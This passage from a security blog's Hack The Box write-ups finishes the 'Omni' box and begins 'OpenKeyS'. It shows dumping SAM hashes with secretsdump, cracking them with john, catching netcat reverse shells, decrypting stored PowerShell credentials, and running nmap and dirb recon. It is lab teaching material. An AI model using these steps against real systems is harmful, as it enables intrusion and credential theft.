&lt;p&gt;Once transfered we use &lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket's&lt;/a&gt;
secret dump to extract the hashes from the &lt;code&gt;SAM&lt;/code&gt; and &lt;code&gt;SYSTEM&lt;/code&gt; files.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/installed_tools/impacket/examples$ python3 secretsdump.py -sam ~/pown/sam -system ~/pown/system -outputfile out LOCAL&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)&lt;/span&gt;
&lt;span class="code-line"&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::&lt;/span&gt;
&lt;span class="code-line"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::&lt;/span&gt;
&lt;span class="code-line"&gt;DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::&lt;/span&gt;
&lt;span class="code-line"&gt;app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Cleaning up...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run john on the collected hashes and get the &lt;code&gt;app&lt;/code&gt; user password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@fomalhaut htb_omni]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=NT&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 6 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])&lt;/span&gt;
&lt;span class="code-line"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;
&lt;span class="code-line"&gt;Each node loaded 1/8 of wordfile to memory (about 16 MB/node)&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;                (Guest)&lt;/span&gt;
&lt;span class="code-line"&gt;mesh5143         (app)&lt;/span&gt;
&lt;span class="code-line"&gt;7 1g 0:00:00:09 DONE (2020-08-28 11:14) 0.1009g/s 2951Kp/s 2951Kc/s 14755KC/s Aateetaing..Aaaaaaaaaaaawing&lt;/span&gt;
&lt;span class="code-line"&gt;5 1g 0:00:00:09 DONE (2020-08-28 11:14) 0.1005g/s 2939Kp/s 2939Kc/s 14769KC/s Abbyramying..Aaaaaaaaaaaaing&lt;/span&gt;
&lt;span class="code-line"&gt;2 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2921Kp/s 2921Kc/s 17530KC/s Aanyahing..Aaaaaaaaaaaaaaaaaaaaaaaaain&lt;/span&gt;
&lt;span class="code-line"&gt;6 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2921Kp/s 2921Kc/s 17529KC/s Abdelaing..Aaaaazing&lt;/span&gt;
&lt;span class="code-line"&gt;4 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2912Kp/s 2912Kc/s 17475KC/s Aberdaying..Aaaaaaaaaaaaaaaing&lt;/span&gt;
&lt;span class="code-line"&gt;3 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2909Kp/s 2909Kc/s 17456KC/s Abgboing..Aaaaaaaaaaaaaaaaaaaaaing&lt;/span&gt;
&lt;span class="code-line"&gt;8 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2897Kp/s 2897Kc/s 17382KC/s Abeloliving..Aaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/span&gt;
&lt;span class="code-line"&gt;1 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2855Kp/s 2855Kc/s 17130KC/s Abigayling..Soleiling&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then connect to the web service on port 8080 using this credentials. There is
specific page to run command.&lt;/p&gt;
&lt;p&gt;&lt;img alt="User interface" src="/media/2021.02/omni_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We just run netcat to get a reverse shell as &lt;code&gt;app&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nc -l -p 1234&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.107]&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;echo %username%&lt;/span&gt;
&lt;span class="code-line"&gt;app&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="encrypted-strings"&gt;Encrypted Strings&lt;/h2&gt;
&lt;p&gt;We go back to the &lt;code&gt;app&lt;/code&gt;'s user data folder, and use
&lt;a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7#example-2--create-a-secure-string-from-an-encrypted-string-in-a-file"&gt;Microsoft documentation&lt;/a&gt;
to decrypt the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32&amp;gt;cd C:\Data\Users\app&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;type user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/TN&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;S N=&amp;quot;UserName&amp;quot;&amp;gt;flag&amp;lt;/S&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;SS N=&amp;quot;Password&amp;quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&amp;lt;/SS&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;/Obj&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/Objs&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;Powershell&lt;/span&gt;
&lt;span class="code-line"&gt;Windows PowerShell&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (C) Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $Secure2 = ConvertTo-SecureString -String &amp;#39;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential.GetNetworkCredential().Password&lt;/span&gt;
&lt;span class="code-line"&gt;$credential.GetNetworkCredential().Password&lt;/span&gt;
&lt;span class="code-line"&gt;7cfd50f6bc34db3204898f1505ad9d70&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We do exactly the same with the &lt;code&gt;iot-admin.xml&lt;/code&gt; file to retrieve the
administrator password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\Data\Users\app&amp;gt;type iot-admin.xml&lt;/span&gt;
&lt;span class="code-line"&gt;type iot-admin.xml&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/TN&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;S N=&amp;quot;UserName&amp;quot;&amp;gt;omni\administrator&amp;lt;/S&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;SS N=&amp;quot;Password&amp;quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&amp;lt;/SS&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;/Obj&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/Objs&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $Secure2 = ConvertTo-SecureString -String &amp;#39;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
&lt;span class="code-line"&gt;$credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential.GetNetworkCredential().Password&lt;/span&gt;
&lt;span class="code-line"&gt;$credential.GetNetworkCredential().Password&lt;/span&gt;
&lt;span class="code-line"&gt;_1nt3rn37ofTh1nGz&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We once more connect to the web application on port 8080 and execute netcat to
get a reverse shell as &lt;code&gt;administrator&lt;/code&gt;. And we use the above method to decrypt the root
flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nc -l -p 1234&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.107]&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;echo %username%&lt;/span&gt;
&lt;span class="code-line"&gt;echo %username%&lt;/span&gt;
&lt;span class="code-line"&gt;Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;cd &amp;quot;C:\Data\Users\administrator\&lt;/span&gt;
&lt;span class="code-line"&gt;cd &amp;quot;C:\Data\Users\administrator\&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\administrator&amp;gt;dir&lt;/span&gt;
&lt;span class="code-line"&gt;dir&lt;/span&gt;
&lt;span class="code-line"&gt;Volume in drive C is MainOS&lt;/span&gt;
&lt;span class="code-line"&gt;Volume Serial Number is 3C37-C677&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Directory of C:\Data\Users\administrator&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  09:48 PM    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  09:48 PM    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          3D Objects&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Documents&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Downloads&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Favorites&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Music&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Pictures&lt;/span&gt;
&lt;span class="code-line"&gt;07/04/2020  09:48 PM             1,958 root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Videos&lt;/span&gt;
&lt;span class="code-line"&gt;              1 File(s)          1,958 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;              9 Dir(s)   4,691,116,032 bytes free&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\administrator&amp;gt;type root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/TN&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;S N=&amp;quot;UserName&amp;quot;&amp;gt;flag&amp;lt;/S&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;SS N=&amp;quot;Password&amp;quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&amp;lt;/SS&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/Props&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;/Obj&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/Objs&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Data\Users\administrator&amp;gt;Powershell&lt;/span&gt;
&lt;span class="code-line"&gt;Powershell&lt;/span&gt;
&lt;span class="code-line"&gt;Windows PowerShell&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (C) Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\administrator&amp;gt; $Secure2 = ConvertTo-SecureString -String &amp;#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\administrator&amp;gt; $credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
&lt;span class="code-line"&gt;PS C:\Data\Users\administrator&amp;gt; $credential.GetNetworkCredential().Password&lt;/span&gt;
&lt;span class="code-line"&gt;$credential.GetNetworkCredential().Password&lt;/span&gt;
&lt;span class="code-line"&gt;5dbdce5569e2c4708617c0ce6e9bf11d&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;I was really intrigued by the Unknown operating system but it turns out it was a
simple guessing game and once you know what the operating system was the box was
really straightforward (if you don't mess up the heavy &lt;code&gt;SYSTEM&lt;/code&gt; extraction as I
did). This is clearly one of the worst box created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; even if the fact to
use Windows IOT is quit "funny".&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="IOT"></category></entry><entry><title>HTB: OpenKeyS</title><link href="https://maggick.fr/2020/12/htb-openkeys.html" rel="alternate"></link><published>2020-12-14T09:50:00+01:00</published><updated>2020-12-14T09:50:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-14:/2020/12/htb-openkeys.html</id><summary type="html">&lt;p&gt;&lt;img alt="openkeys card" class="align-left" src="/media/2020.12/openkeys_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/267"&gt;OpenKeys&lt;/a&gt; published on
July 25 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/159204"&gt;polarbearer&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/125033"&gt;GibParadox&lt;/a&gt;
This box is classified as a medium machine. This box implies an openBSD box with
a &lt;code&gt;check_auth&lt;/code&gt; exploit.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.12/openkeys_card.png" alt="openkeys card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/267"&gt;OpenKeys&lt;/a&gt; published on
July 25 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/159204"&gt;polarbearer&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/125033"&gt;GibParadox&lt;/a&gt;
This box is classified as a medium machine. This box implies an openBSD box with
a &lt;code&gt;check_auth&lt;/code&gt; exploit.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only port 22 (SSH) and port 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Aug 01 01:44:44 2020 as: nmap -p- -sSV -oN nmap 10.10.10.199&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.199&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.078s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    OpenBSD httpd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sat Aug 01 01:47:51 2020 -- 1 IP address (1 host up) scanned in 786.94 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website is authentication form. As the page title indicate, we could
probably get SSH key if we can access an user account.&lt;/p&gt;
&lt;p&gt;&lt;img alt="home page" src="/media/2020.12/openkeys_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We run &lt;code&gt;dirb&lt;/code&gt; against the website. It found a few folders.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ dirb http://10.10.10.199&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Sun Aug 02 01:53:56 2020&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.199/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.199/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/css/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/fonts/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/images/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/includes/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.199/index.html (CODE:200|SIZE:96)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.199/index.php (CODE:200|SIZE:4837)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/js/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/vendor/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.199/css/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.199/fonts/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We browse the founded directories as the directory listing is activated. We
found something interesting in the &lt;code&gt;includes&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;&lt;img alt="includes folder" src="/media/2020.12/openkeys_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We take a look at the swap file and found a username "jennifer". We also notice
a system call to &lt;code&gt;check_auth&lt;/code&gt;.&lt;/p&gt;
